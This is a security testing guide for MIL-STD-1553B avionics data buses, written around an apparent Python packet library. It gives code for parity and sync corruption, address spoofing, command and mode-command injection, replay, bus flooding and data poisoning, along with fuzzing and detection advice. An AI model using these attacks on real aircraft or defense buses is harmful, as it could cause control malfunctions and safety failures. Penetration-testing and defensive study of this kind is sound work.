# MIL-STD-1553B Security Testing Guide

## Overview

This guide provides practical instructions for security testing MIL-STD-1553B implementations using the packet engine. It covers attack vectors, testing methodologies, and example scenarios for penetration testing and vulnerability assessment.

## Table of Contents

1. [Security Testing Methodology](#security-testing-methodology)
2. [Attack Surface Analysis](#attack-surface-analysis)
3. [Fuzzing Techniques](#fuzzing-techniques)
4. [Attack Scenarios](#attack-scenarios)
5. [Validation and Detection](#validation-and-detection)
6. [Best Practices](#best-practices)

## Security Testing Methodology

### 1. Reconnaissance

**Objective**: Understand the target 1553B implementation

```python
from mil1553.devices import BusMonitor
from mil1553.output import AnnotatedHexFormatter

# Set up passive monitoring
monitor = BusMonitor(device_id="BM_Recon")
monitor.start_capture()

# Capture traffic for analysis
# ... wait for bus activity ...

messages = monitor.stop_capture()
analyzer = AnnotatedHexFormatter()

# Analyze message patterns
for msg in messages:
    print(analyzer.format_message(msg))
```

**Look For:**
- Message frequency and timing
- RT addresses in use
- Subaddress usage patterns
- Error handling behavior
- Mode command support

### 2. Vulnerability Assessment

**Common Vulnerabilities in 1553B Implementations:**

| Vulnerability | Standard Violation | Severity |
|--------------|-------------------|----------|
| Missing parity validation | §4.3.5.2.1.2 | HIGH |
| Timing constraint bypass | §4.3.4.6.2.3 | MEDIUM |
| Address validation bypass | §4.3.5.2.2.1 | CRITICAL |
| Improper mode command handling | §4.3.4.3 | HIGH |
| BC authority bypass | §4.3.4.1.1 | CRITICAL |
| Broadcast injection | §4.3.4.4 | MEDIUM |

### 3. Exploitation

Target specific vulnerabilities with crafted packets.

### 4. Post-Exploitation

Analyze impact and document findings.

## Attack Surface Analysis

### Protocol-Level Attacks

#### 1. Parity Attacks (§4.3.5.2.1.2 Violation)

**Vulnerability**: Implementation doesn't validate odd parity

**Test**:
```python
from mil1553 import CommandWord, create_bc_to_rt_message, DataWord

# Create valid command
cmd = CommandWord(rt_address=5, transmit_receive=0, subaddress=10, word_count=1)

# Corrupt parity
cmd_bad_parity = cmd.corrupt_parity()

# Test RT response
msg = create_bc_to_rt_message(5, 10, [DataWord(payload=0x1234)])
msg.command_words[0] = cmd_bad_parity

# Transmit and observe
# Does RT reject? Does it accept invalid parity?
```

**Expected Secure Behavior**: RT rejects message with parity error
**Insecure Behavior**: RT processes message despite parity error

#### 2. Sync Pattern Attacks (§4.3.5.2.1 Violation)

**Vulnerability**: Implementation doesn't validate sync patterns

**Test**:
```python
# Create command with data sync (invalid for command)
cmd_bad_sync = cmd.corrupt_sync(new_sync=0b000)  # Data sync on command

# Test processing
# Secure: RT ignores
# Insecure: RT processes as command
```

#### 3. Address Spoofing (§4.3.5.2.2.1 Violation)

**Vulnerability**: RT accepts commands for other addresses

**Test**:
```python
# Send command to RT 5 with RT 7 in status
cmd_rt5 = CommandWord(rt_address=5, transmit_receive=1, subaddress=10, word_count=2)
status_rt7 = StatusWord(rt_address=7)  # Wrong RT!

from mil1553 import Message, MessageType
msg = Message(
    message_type=MessageType.RT_TO_BC,
    command_word=cmd_rt5,
    status_word=status_rt7,  # Address mismatch
    data_words=[DataWord(payload=0xAAAA)]
)

# Does BC detect mismatch?
```

### Timing-Based Attacks

#### 4. Response Time Violations (§4.3.4.6.2.3.2)

**Vulnerability**: BC doesn't enforce 4-12 μs response window

**Test**:
```python
from mil1553.security.attacks import TimingAttacker

attacker = TimingAttacker()

# RT responds too quickly (< 4 μs)
early_response = attacker.violate_response_time(msg, violation_us=-2.0)

# RT responds too slowly (> 12 μs)
late_response = attacker.violate_response_time(msg, violation_us=+5.0)

# Test BC acceptance
```

#### 5. Inter-Message Gap Violations (§4.3.4.6.2.3.1)

**Vulnerability**: BC accepts messages without proper gap

**Test**:
```python
# Send messages with insufficient gap (< 4 μs)
msg1 = create_bc_to_rt_message(5, 10, [DataWord(payload=0x1111)])
msg1.gap_time = 2.0  # Below minimum

msg2 = create_bc_to_rt_message(5, 10, [DataWord(payload=0x2222)])

# Transmit back-to-back
# Does implementation handle properly?
```

### Command Injection Attacks

#### 6. Unauthorized BC Commands (§4.3.4.1.1 Violation)

**Vulnerability**: RT processes commands from non-BC source

**Test**:
```python
from mil1553.security.attacks import CommandInjector

injector = CommandInjector()

# RT attempts to act as BC
malicious_cmd = CommandWord(rt_address=7, transmit_receive=1, subaddress=5, word_count=1)

# Inject during inter-message gap
injector.inject_command(malicious_cmd, timing='between_messages')

# Secure: Bus detects unauthorized transmission
# Insecure: Command is processed
```

#### 7. Mode Command Injection (§4.3.4.3)

**Vulnerability**: Unauthorized mode commands accepted

**Test**:
```python
from mil1553 import create_mode_command_message, ModeCode

# Inject Reset RT mode command
reset_cmd = create_mode_command_message(
    rt_address=5,
    mode_code=ModeCode.RESET_REMOTE_TERMINAL,
    transmit_receive=1
)

# Inject from unauthorized source
# Impact: RT reset, potential DoS
```

### Broadcast Attacks

#### 8. Broadcast Injection (§4.3.4.4)

**Vulnerability**: Broadcast messages not properly authenticated

**Test**:
```python
# Create broadcast with malicious data
broadcast = create_bc_to_rt_message(
    rt_address=31,  # Broadcast
    subaddress=10,
    data_words=[DataWord(payload=0xDEAD)]
)

# All RTs receive without authentication
# Potential impact: Mass poisoning
```

## Fuzzing Techniques

### 1. Bit-Flip Fuzzing

**Objective**: Find unexpected behavior with bit corruption

```python
from mil1553.security import Fuzzer, BitFlipFuzzer

# Create fuzzer
fuzzer = Fuzzer(strategy=BitFlipFuzzer(mutation_rate=0.05))

# Generate test cases
baseline = create_bc_to_rt_message(5, 10, [DataWord(payload=0x1234)])
test_cases = fuzzer.generate_test_cases(count=1000, template=baseline)

# Test each case
for i, test_msg in enumerate(test_cases):
    response = transmit_and_receive(test_msg)
    if is_anomalous(response):
        print(f"Anomaly found in test case {i}")
        save_crash(test_msg, response)
```

### 2. Boundary Value Fuzzing

**Objective**: Test edge cases and boundaries

```python
from mil1553.security import BoundaryFuzzer

fuzzer = Fuzzer(strategy=BoundaryFuzzer())

# Test boundary values
boundaries = {
    'rt_address': [0, 1, 30, 31],           # Min, valid, max, broadcast
    'subaddress': [0, 1, 30, 31],           # Mode, valid, valid, mode
    'word_count': [0, 1, 31],               # 32 words, 1 word, 31 words
    'payload': [0x0000, 0x7FFF, 0x8000, 0xFFFF]  # Boundaries
}

test_cases = fuzzer.generate_from_boundaries(boundaries)
```

### 3. Semantic Fuzzing

**Objective**: Maintain valid structure but fuzz semantics

```python
from mil1553.security import SemanticFuzzer

fuzzer = Fuzzer(strategy=SemanticFuzzer())

# Valid structure, fuzzy semantics
# - Word count mismatch (declare 5, send 3)
# - Invalid mode codes
# - Reserved bit manipulation
# - Status flag combinations

test_cases = fuzzer.fuzz_message(baseline)
```

### 4. Stateful Fuzzing

**Objective**: Fuzz message sequences and state transitions

```python
# Create message sequence
sequence = [
    create_bc_to_rt_message(5, 10, [DataWord(payload=0x0001)]),
    create_rt_to_bc_message(5, 10, [DataWord(payload=0x0002)]),
    create_mode_command_message(5, ModeCode.TRANSMIT_STATUS_WORD, 1)
]

# Fuzz sequence
fuzzed_sequences = fuzzer.fuzz_sequence(sequence, mutations=100)

# Test state machine
for seq in fuzzed_sequences:
    test_sequence(seq)
```

## Attack Scenarios

### Scenario 1: RT Command Injection

**Objective**: RT impersonates BC to send commands

**Setup**:
```python
from mil1553.security.attacks import CommandInjector
from mil1553.devices import RemoteTerminal

# Compromised RT
malicious_rt = RemoteTerminal(rt_address=7)

# Create unauthorized command
attack_cmd = CommandWord(rt_address=5, transmit_receive=0, subaddress=15, word_count=1)
attack_msg = create_bc_to_rt_message(5, 15, [DataWord(payload=0xBADC0DE)])

# Inject during inter-message gap
injector = CommandInjector()
injector.inject_between_messages(normal_msg1, normal_msg2, attack_msg)
```

**Detection**:
- Bus monitor detects transmission from non-BC
- Timing analysis shows unauthorized transmission
- BC detects unexpected message

### Scenario 2: Replay Attack

**Objective**: Capture and replay valid commands

**Setup**:
```python
from mil1553.security.attacks import ReplayAttacker

# Capture valid command
attacker = ReplayAttacker()
captured_msg = attacker.capture_message(legitimate_msg)

# Replay later (potentially modified)
attacker.replay(
    captured_msg,
    delay=1000,  # 1ms later
    modifications={'data_words': [DataWord(payload=0xEVIL)]}
)
```

**Detection**:
- Sequence number checking (if implemented)
- Timing anomalies
- Unexpected duplicate commands

### Scenario 3: DoS via Bus Flooding

**Objective**: Flood bus with rapid messages

**Setup**:
```python
from mil1553.security.attacks import TimingAttacker

attacker = TimingAttacker()

# Generate flood
flood_msg = create_bc_to_rt_message(31, 10, [DataWord(payload=0xFFFF)])  # Broadcast

# Send rapidly, violating inter-message gap
attacker.create_bus_flood(
    duration=1000,  # 1ms flood
    message_template=flood_msg,
    gap_time=0.5    # Below minimum (4 μs)
)
```

**Impact**:
- Bus saturation
- Legitimate traffic blocked
- RT overload

### Scenario 4: Data Poisoning

**Objective**: Inject false data into RT memory

**Setup**:
```python
# Send valid-looking but malicious data
poison_data = [
    DataWord(payload=0x0000),  # Clear critical value
    DataWord(payload=0xFFFF),  # Set all bits
    DataWord(payload=0x8000),  # Sign bit manipulation
]

poison_msg = create_bc_to_rt_message(
    rt_address=5,
    subaddress=20,  # Critical control subaddress
    data_words=poison_data
)

# If RT doesn't validate data ranges...
```

**Impact**:
- Control system malfunction
- Safety violations
- Mission failure

## Validation and Detection

### Implementing Detection

```python
from mil1553.core.validation import ProtocolValidator
from mil1553.security.validators import SecurityValidator

# Protocol validation
protocol_val = ProtocolValidator(strict=True)
result = protocol_val.validate_message(msg)

if not result.is_valid:
    for violation in result.violations:
        log_security_event(violation)
        if violation.severity in [Severity.HIGH, Severity.CRITICAL]:
            block_message(msg)

# Security validation
security_val = SecurityValidator()
anomalies = security_val.check_anomalies(msg)

if anomalies:
    alert_security_team(anomalies)
```

### Anomaly Detection

```python
# Statistical baseline
class BaselineMonitor:
    def __init__(self):
        self.baseline = {
            'message_rate': 0,
            'rt_addresses_seen': set(),
            'timing_avg': 0,
            'error_rate': 0
        }

    def is_anomalous(self, msg):
        # Check against baseline
        if msg.calculate_message_duration() > self.baseline['timing_avg'] * 2:
            return True  # Timing anomaly

        if has_parity_error(msg):
            return True  # Protocol anomaly

        return False
```

## Best Practices

### For Security Testing

1. **Authorization**: Ensure proper authorization before testing production systems
2. **Isolation**: Test on isolated bus segments when possible
3. **Documentation**: Document all test cases and results
4. **Baseline**: Establish normal behavior before testing
5. **Incremental**: Start with passive monitoring, progress to active testing
6. **Safety**: Consider safety implications in aerospace/defense systems

### For Secure Implementation

1. **Validate Everything**:
   - Parity on every word
   - Sync patterns
   - Address ranges
   - Timing constraints

2. **Enforce Protocol**:
   - Only BC transmits commands
   - RT response times (4-12 μs)
   - Inter-message gaps (≥ 4 μs)

3. **Authentication**:
   - Verify message source
   - Sequence numbers
   - Cryptographic signatures (if applicable)

4. **Monitoring**:
   - Log all anomalies
   - Real-time anomaly detection
   - Traffic analysis

5. **Defense in Depth**:
   - Multiple validation layers
   - Fail-safe defaults
   - Graceful error handling

### Testing Checklist

- [ ] Parity validation bypass
- [ ] Sync pattern validation
- [ ] Address range checking
- [ ] Word count validation
- [ ] Timing enforcement
- [ ] BC authority verification
- [ ] Mode command authentication
- [ ] Broadcast handling
- [ ] Replay attack resistance
- [ ] DoS resistance
- [ ] Error handling
- [ ] Edge cases and boundaries

## Example: Complete Security Assessment

```python
#!/usr/bin/env python3
"""Complete security assessment of 1553B implementation"""

from mil1553 import *
from mil1553.security import *
from mil1553.output import AnnotatedHexFormatter

class SecurityAssessment:
    def __init__(self, target_rt):
        self.target_rt = target_rt
        self.results = []
        self.formatter = AnnotatedHexFormatter()

    def test_parity_validation(self):
        """Test if RT validates parity"""
        cmd = CommandWord(rt_address=self.target_rt, transmit_receive=0,
                         subaddress=10, word_count=1)
        cmd_bad = cmd.corrupt_parity()

        msg = create_bc_to_rt_message(self.target_rt, 10, [DataWord(payload=0x1234)])
        msg.command_words[0] = cmd_bad

        response = self.transmit(msg)
        if response:
            self.results.append({
                'test': 'parity_validation',
                'status': 'FAIL',
                'severity': 'HIGH',
                'detail': 'RT accepted message with invalid parity'
            })
        else:
            self.results.append({
                'test': 'parity_validation',
                'status': 'PASS'
            })

    def test_timing_enforcement(self):
        """Test if BC enforces timing constraints"""
        # Test rapid messages
        # Test response time violations
        pass

    def test_injection_resistance(self):
        """Test if bus detects unauthorized commands"""
        # Attempt command injection from RT
        pass

    def run_full_assessment(self):
        """Run all security tests"""
        print("Starting security assessment...")

        self.test_parity_validation()
        self.test_timing_enforcement()
        self.test_injection_resistance()
        # ... more tests

        return self.generate_report()

    def generate_report(self):
        """Generate security assessment report"""
        print("\n" + "="*70)
        print("SECURITY ASSESSMENT REPORT")
        print("="*70)

        for result in self.results:
            status_icon = "✓" if result['status'] == 'PASS' else "✗"
            print(f"{status_icon} {result['test']}: {result['status']}")
            if result.get('detail'):
                print(f"   {result['detail']}")

        return self.results

# Run assessment
assessment = SecurityAssessment(target_rt=5)
results = assessment.run_full_assessment()
```

## Conclusion

This guide provides a foundation for security testing MIL-STD-1553B implementations. Always follow responsible disclosure practices and obtain proper authorization before testing.

## References

- MIL-STD-1553B: Aircraft Internal Time Division Command/Response Multiplex Data Bus
- NIST SP 800-115: Technical Guide to Information Security Testing and Assessment
- OWASP Testing Guide: Principles and methodologies
- DO-326A: Airworthiness Security Process Specification

## Appendix: Quick Reference

### Common Attack Vectors

| Attack | Standard Violation | Detection Method |
|--------|-------------------|------------------|
| Bad Parity | §4.3.5.2.1.2 | Parity check |
| Bad Sync | §4.3.5.2.1 | Sync validation |
| Address Spoof | §4.3.5.2.2.1 | Address check |
| Timing | §4.3.4.6 | Timing monitor |
| Injection | §4.3.4.1.1 | Source verification |
| Replay | - | Sequence numbers |
| DoS Flood | §4.3.4.6 | Rate limiting |

### Security Testing Tools

```python
# Quick imports for security testing
from mil1553.security import (
    Fuzzer,
    BitFlipFuzzer,
    BoundaryFuzzer,
    SemanticFuzzer
)
from mil1553.security.attacks import (
    CommandInjector,
    ReplayAttacker,
    TimingAttacker,
    MalformedPacketGenerator
)
from mil1553.security.validators import (
    SecurityValidator
)
```
